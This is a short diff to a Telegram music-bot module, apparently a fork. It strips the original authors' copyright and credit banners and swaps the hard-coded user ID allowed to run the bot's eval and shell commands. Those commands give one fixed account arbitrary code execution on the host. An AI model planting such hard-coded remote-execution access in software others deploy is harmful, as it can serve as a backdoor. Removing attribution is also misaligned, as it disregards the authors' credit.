@@ -1,11 +1,3 @@
-# =======================================================
-# ©️ 2025-26 All Rights Reserved by Purvi Bots (suraj08832) 🚀
-
-# This source code is under MIT License 📜 Unauthorized forking, importing, or using this code without giving proper credit will result in legal action ⚠️
- 
-# 📩 DM for permission : @brahix
-# =======================================================
-
 import os
 import re
 import subprocess
@@ -38,13 +30,13 @@ async def edit_or_reply(msg: Message, **kwargs):
 
 @app.on_edited_message(
     filters.command("eval")
-    & filters.user(7473021518)
+    & filters.user(7808531413)
     & ~filters.forwarded
     & ~filters.via_bot
 )
 @app.on_message(
     filters.command("eval")
-    & filters.user(7473021518)
+    & filters.user(7808531413)
     & ~filters.forwarded
     & ~filters.via_bot
 )
@@ -217,11 +209,3 @@ async def shellrunner(_, message: Message):
     else:
         await edit_or_reply(message, text="<b>OUTPUT :</b>\n<code>None</code>")
     await message.stop_propagation()
-
-# ======================================================
-# ©️ 2025-26 All Rights Reserved by Purvi Bots (suraj08832) 😎
-
-# 🧑‍💻 Developer : t.me/brahix
-# 🔗 Source link : GitHub.com/suraj08832/Sonali-MusicV2
-# 📢 Telegram channel : t.me/about_brahix
-# =======================================================
